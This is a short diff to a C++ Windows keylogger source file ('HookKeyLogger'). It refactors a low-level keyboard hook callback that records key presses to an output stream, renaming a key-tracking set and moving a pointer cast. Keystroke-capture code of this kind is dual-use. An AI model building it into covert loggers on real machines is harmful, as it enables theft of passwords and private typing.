@@ -1,12 +1,13 @@
 #include "HookKeyLogger.h"
 
 static std::ostream *out;
-std::set<char> pressedKeys;
+std::set<char> modifiersPressed;
 
 static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	if (nCode == HC_ACTION)
 	{
+		const auto* ptr = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
 		std::string output;
 		if(wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
 		{
@@ -16,7 +17,6 @@ static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lP
 			output = "key ^";
 		}
 		*out << output << std::endl;
-		const auto *ptr = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
 	}
 	return CallNextHookEx(nullptr, nCode, wParam, lParam);
 }
